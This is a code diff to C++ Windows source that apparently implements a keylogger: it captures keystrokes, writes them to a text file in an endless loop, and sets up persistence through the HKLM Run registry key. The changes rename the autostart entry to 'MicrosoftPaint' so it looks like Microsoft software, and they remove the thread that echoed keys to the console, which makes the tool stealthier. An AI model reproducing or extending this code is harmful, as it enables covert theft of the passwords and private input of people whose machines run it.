@@ -1,4 +1,5 @@
 #include "keyboard.h"
+
 bool isCapsLock() {
 	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
 		return true;
@@ -111,7 +112,7 @@ auto detectKey() {
 	}
 }
 
-void WritefileAya()
+void saveInTextFile()
 {
 	std::ofstream myfile;
 	while (true) {
@@ -126,15 +127,6 @@ void WritefileAya()
 	}
 }
 
-auto migrant()
-{
-	while (true)
-	{
-		std::string key = detectKey();
-		std::cout << key;
-	}
-}
-
 bool PersistantApplication() {
 	HMODULE hModule = NULL;
 	std::string reg;
@@ -144,7 +136,7 @@ bool PersistantApplication() {
 	HKEY key;
 	LONG regeditOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
 	if (regeditOpen == ERROR_SUCCESS) {
-		regeditOpen = RegSetValueEx(key, "MicrosoftPainte", 0, REG_SZ, (BYTE*)reg.c_str(), (reg.size() + 1) * sizeof(wchar_t));
+		regeditOpen = RegSetValueEx(key, "MicrosoftPaint", 0, REG_SZ, (BYTE*)reg.c_str(), (reg.size() + 1) * sizeof(wchar_t));
 		if (regeditOpen == ERROR_SUCCESS) {
 			return true;
 		}
@@ -156,16 +148,13 @@ bool PersistantApplication() {
 		return false;
 	}
 }
-int main()
-{
 
+void main()
+{
 	std::thread t1;
 	std::thread t2;
-	std::thread t3;
 	t1 = std::thread(PersistantApplication);
-	t2 = std::thread(migrant);
-	t3 = std::thread(WritefileAya);
+	t2 = std::thread(saveInTextFile);
 	t1.join();
 	t2.join();
-	t3.join();
 }
